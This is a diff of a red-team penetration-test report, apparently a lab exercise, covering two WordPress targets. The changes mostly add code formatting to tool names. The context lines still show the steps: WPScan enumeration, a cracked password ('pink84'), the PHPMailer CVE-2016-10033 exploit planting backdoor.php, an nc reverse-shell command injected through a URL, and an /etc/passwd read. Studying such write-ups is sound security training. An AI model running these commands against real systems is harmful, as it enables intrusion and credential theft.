@@ -57,7 +57,7 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 
   - `flag1.txt`: b9bbcb33e11b80be759c4e844862482d
     - **Exploit Used**:
-      - Enumerated WordPress site Users with WPScan to obtain username `michael`, used SSH to get user shell.
+      - Enumerated WordPress site Users with `WPScan` to obtain username `michael`, used `SSH` to get user shell.
     - **Command**: `wpscan --url 192.168.1.110/wordpress --enumerate u`
 
 ```bash
@@ -94,7 +94,7 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 
   - `flag2.txt`: fc3fd58dcdad9ab23faca6e9a36e581c
     - **Exploit Used**
-      - Enumerated WordPress site Users with WPScan to obtain username `michael`, used SSH to get user shell.
+      - Enumerated WordPress site Users with `WPScan` to obtain username `michael`, used `SSH` to get user shell.
     - **Command**: `cat var/www/flag2.txt`
 
 ```bash
@@ -111,7 +111,7 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 
   - `flag3.txt`: afc01ab56b50591e7dccf93122770cd2
     - **Exploit Used**
-      - Continued using user shell to find the MySQL database password, logged into MySQL database, and found Flag 3 in wp_posts table.
+      - Continued using user shell to find the MySQL database password, logged into MySQL database, and found Flag 3 in `wp_posts` table.
 
   - Finding the MySQL database password:
     - **Command**: `cd /var/www/html/wordpress/`
@@ -156,7 +156,7 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 
   - `flag4.txt`: 715dea6c055b9fe3337544932f2941ce
     - **Exploit Used**
-      - Used john to crack the password hash obtained from MySQL database, secured new user shell as Steven, escalated to root.
+      - Used `john` to crack the password hash obtained from MySQL database, secured new user shell as `Steven`, escalated to root.
 
   - Cracking the password hash with john.
     - Copied password hash from MySQL into `~/Desktop/hash.txt` and cracked with john to discover Steven’s password is `pink84`.
@@ -224,7 +224,7 @@ This scan identifies the services below as potential points of entry:
 
 The following vulnerabilities were identified on Target 2:
 - CVE-2016-10033 (Remote Code Execution Vulnerability in PHPMailer 5.2.16)
-- URL Enumeration (WordPress site)
+- Enumeration (WordPress site)
 - Weak Root Password
 - Misconfiguration of User Privileges/Privilege Escalation
 
@@ -238,7 +238,7 @@ The Red Team was able to penetrate `Target 2` and retrieve the following confide
 
   - `flag1`: a2c1f66d2b8051bd3a5874b5b6e43e21
     - **Exploit Used**:
-      - Enumerated WordPress site with Nikto and Gobuster to create a list of exposed URLs from the Target HTTP server and gather version information.
+      - Enumerated WordPress site with `Nikto` and `Gobuster` to create a list of exposed URLs from the Target HTTP server and gather version information.
     - **Command**: `nikto -C all -h 192.168.1.115`
 
 ```bash
@@ -247,7 +247,7 @@ The Red Team was able to penetrate `Target 2` and retrieve the following confide
 
 ![Nikto Output](Images/target2_nikto.png)
   - Determined the website is running on Apache/2.4.10 (Debian).
-  - Performed a more in-depth enumeration with gobuster.
+  - Performed a more in-depth enumeration with Gobuster.
     - **Command**: `sudo apt-get update`
     - **Command**: `sudo apt-get install gobuster`
     - **Command**: `gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u 192.168.1.115`
@@ -278,7 +278,7 @@ The Red Team was able to penetrate `Target 2` and retrieve the following confide
 
   - `flag2.txt`: 6a8ed560f0b5358ecf844108048eb337
     - **Exploit Used**:
-      - Used Searchsploit to find vulnerability associated with PHPMailer 5.2.16, exploited with bash script to open backdoor on target, and opened shell on target with Ncat listener.
+      - Used `Searchsploit` to find vulnerability associated with PHPMailer 5.2.16, exploited with bash script to open backdoor on target, and opened reverse shell on target with `Ncat` listener.
     - **Command**: `nc -lnvp 4444`
     - **Command**: `nc 192.168.1.90 4444 -e /bin/bash`
     - **URL**: `192.168.1.115/backdoor.php?cmd=nc%20192.168.1.90%204444%20-e%20/bin/bash`
@@ -292,7 +292,7 @@ The Red Team was able to penetrate `Target 2` and retrieve the following confide
 
 ![Searchsploit](Images/target2_searchsploit.png)
 
-  - Confirmed exploit 40970.php matched with CVE-2016-10033 and PHPMailer version 5.2.16.
+  - Confirmed exploit `40970.php` matched with CVE-2016-10033 and PHPMailer version 5.2.16.
     - **Command**: `searchsploit -x /usr/share/exploitdb/exploits/php/webapps/40970.php`
 
 ```bash
@@ -316,13 +316,13 @@ The Red Team was able to penetrate `Target 2` and retrieve the following confide
 
 ![Script Execution](Images/target2_script_execution.png)
 
-  - Navigating to 192.168.1.115/backdoor.php?cmd=<CMD> now allows bash commands to be executed on Target 2.
+  - Navigating to `192.168.1.115/backdoor.php?cmd=<CMD>` now allows bash commands to be executed on Target 2.
     - **URL**: `192.168.1.115/backdoor.php?cmd=cat%20/etc/passwd`
 
 ![Backdoor 1](Images/target2_backdoor1.png)
 
-  - Used backdoor to open a shell session on the target.
-  - Started netcat listener on attacking Kali VM.
+  - Used backdoor to open a reverse shell session on the target with Ncat listener and command injection in browser.
+  - Started Ncat listener on attacking Kali VM.
     - **Command**: `nc -lnvp 4444`
 
 ```bash
@@ -331,14 +331,14 @@ The Red Team was able to penetrate `Target 2` and retrieve the following confide
 
 ![Ncat](Images/target2_ncat.png)
 
-- In the browser, used backdoor to run command and open shell session on target.
+- In the browser, used backdoor to run command and open reverse shell session on target.
     - **Command**: `nc 192.168.1.90 4444 -e /bin/bash`
     - **URL**: `192.168.1.115/backdoor.php?cmd=nc%20192.168.1.90%204444%20-e%20/bin/bash`
 
 ![Backdoor 2](Images/target2_backdoor2.png)
 
 - This allowed Ncat listener to connect to the target.
-- User shell opened on target using the following command:
+- Interactive user shell opened on target using the following command:
     - **Command**: `python -c ‘import pty;pty.spawn(“/bin/bash”)’`
 
 ```bash
